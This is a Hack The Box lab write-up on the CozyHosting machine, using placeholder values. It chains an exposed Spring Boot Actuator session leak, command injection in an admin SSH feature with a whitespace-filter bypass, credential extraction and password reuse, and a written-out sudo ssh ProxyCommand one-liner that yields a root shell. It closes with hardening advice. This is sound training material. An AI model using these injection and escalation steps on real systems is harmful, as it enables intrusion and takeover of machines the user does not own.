---
title: "CozyHosting: Spring Boot Actuator Exposure and Command Injection"
description: "A Spring Boot Actuator session leak grants admin access and command injection in the SSH feature provides a foothold; credentials from the application JAR and an SSH ProxyCommand sudo rule lead to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - spring-boot
  - command-injection
---

## Summary

CozyHosting is an Easy Linux HTB machine running a Spring Boot web application behind nginx. Enumeration exposed Spring Boot Actuator endpoints, including `/actuator/sessions`, which leaked an authenticated user session for `<APPLICATION_USER>`. The admin panel's SSH connection feature was vulnerable to command injection through the `username` parameter. Credential extraction from the deployed application JAR revealed PostgreSQL credentials, and cracking an administrative hash yielded a reusable password for SSH access as `<LOCAL_USER>`. Privilege escalation abused a sudo rule allowing `<LOCAL_USER>` to run `/usr/bin/ssh` as root via `ProxyCommand`.

All target-specific values in this document are placeholders. Operator and attacker addresses use `<TARGET_IP>` and `<ATTACKER_IP>` respectively.

## Context and Objective

The engagement targeted a Linux (Ubuntu) machine running nginx as a reverse proxy to a Spring Boot application. The objective was to identify and exploit vulnerabilities to gain user-level and root-level access. SSH (port 22) and HTTP (port 80) were exposed.

## Approach and Evidence

### Enumeration

Port scanning identified the attack surface:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The web service redirected to a virtual host requiring local name resolution. Directory enumeration with feroxbuster discovered a login page and, with a broader wordlist, a Spring Boot Actuator endpoint:

```bash
feroxbuster --url http://<TARGET_VHOST> --wordlist <WORDLIST>
```

```
200      GET        1l        1w      634c http://<TARGET_VHOST>/actuator
```

### Session Hijacking via Actuator

Checking the Actuator sessions endpoint leaked an active session:

```bash
curl -s http://<TARGET_VHOST>/actuator/sessions
```

```
{"<SESSION_ID>":"<APPLICATION_USER>"}
```

Placing the leaked session ID in the browser as the `JSESSIONID` cookie authenticated as `<APPLICATION_USER>`, granting access to the admin panel.

### Command Injection

The admin panel's SSH connection feature accepted `host` and `username` parameters in a POST to `/executessh`. The `username` parameter was incorporated into a shell command, and attacker-controlled input reached the shell:

```http
POST /executessh HTTP/1.1
Host: <TARGET_VHOST>
Cookie: JSESSIONID=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded

host=<ATTACKER_IP>&username=;
```

The response redirected to the admin panel with command output embedded in the `error` parameter, confirming injection. A naive reverse shell payload containing spaces was blocked by a whitespace filter:

```
Username can't contain whitespaces!
```

Bash brace expansion bypassed this restriction. A reverse shell script was hosted on the attacker machine and executed in three steps:

```http
host=<ATTACKER_IP>&username=;<COMMAND_INJECTION_PATTERN>
```

A reverse shell was received as the `app` user:

```
<APPLICATION_SERVICE_USER>@<TARGET_HOST>:<APPLICATION_DIRECTORY>$ whoami
<APPLICATION_SERVICE_USER>
```

### Credential Extraction and Lateral Movement

The application directory contained a deployed Spring Boot JAR. Extraction with `7z` revealed an application configuration file with PostgreSQL credentials stored in cleartext:

```properties
spring.datasource.url=jdbc:postgresql://<DATABASE_HOST>:<DATABASE_PORT>/<DATABASE_NAME>
spring.datasource.username=<DATABASE_USER>
spring.datasource.password=<DB_PASSWORD>
```

Connecting to PostgreSQL and querying the `users` table returned bcrypt hashes:

```sql
SELECT * FROM users;
```

```
<APPLICATION_USER> | <BCRYPT_HASH_1> | User
<APPLICATION_ADMIN> | <BCRYPT_HASH_2> | Admin
```

The administrative hash was cracked offline with hashcat, yielding a password that was reused for the local `<LOCAL_USER>` account, granting SSH access:

```bash
ssh <LOCAL_USER>@<TARGET_HOST>
```

### Privilege Escalation

Sudo enumeration as `<LOCAL_USER>` revealed:

```bash
sudo -l
```

```
User <LOCAL_USER> may run the following commands on <TARGET_HOST>:
    (root) /usr/bin/ssh *
```

This rule allows running the OpenSSH client as root with arbitrary arguments. Using the `ProxyCommand` option executes a local helper command with root privileges:

```bash
sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

A root shell was obtained:

```
# whoami
root
```

## Challenges and Decisions

- The whitespace filter on the `username` parameter blocked simple reverse shell payloads. Bash brace expansion (`{cmd,arg1,arg2}`) executed the desired commands without literal spaces, resolving the issue.
- The admin panel's SSH feature trusted user-controlled input inside a shell command. The filtering was insufficient to prevent injection.

## Outcome

The evidence establishes a complete attack chain: Spring Boot Actuator session leak leading to authenticated access, command injection via the SSH feature for initial foothold, credential extraction from the deployed application JAR and PostgreSQL database, password reuse for lateral movement to `<LOCAL_USER>`, and sudo-based `ssh` ProxyCommand abuse for root.

## Lessons and Recommendations

- **Actuator endpoint exposure:** Spring Boot Actuator endpoints should not be accessible from untrusted networks. Restrict access via network controls or disable unnecessary endpoints in production.
- **Command injection in shell wrappers:** User-controlled input must never reach shell commands unsanitized. Parameterized APIs should replace shell command construction.
- **Secrets in application packages:** Database credentials stored in application configuration within deployable JARs are extractable. Secrets should be managed through environment variables or a dedicated secrets service.
- **Password reuse:** Cracked application credentials reused for system accounts enable lateral movement. Enforce unique credentials per service boundary.
- **Sudo rules for flexible binaries:** Sudo permissions for binaries like `ssh` that accept arbitrary options (e.g., `ProxyCommand`) effectively grant unrestricted root access. Restrict sudo to specific, safe argument patterns.

## References

- Hack The Box, [CozyHosting machine listing](https://app.hackthebox.com/machines/CozyHosting).
- Spring Boot, [Actuator endpoints reference](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html).
- OpenBSD, [`ssh_config(5)` manual](https://man.openbsd.org/ssh_config), including `ProxyCommand` behavior.
- Sudo Project, [sudoers manual](https://www.sudo.ws/docs/man/sudoers.man/), covering command and argument matching.
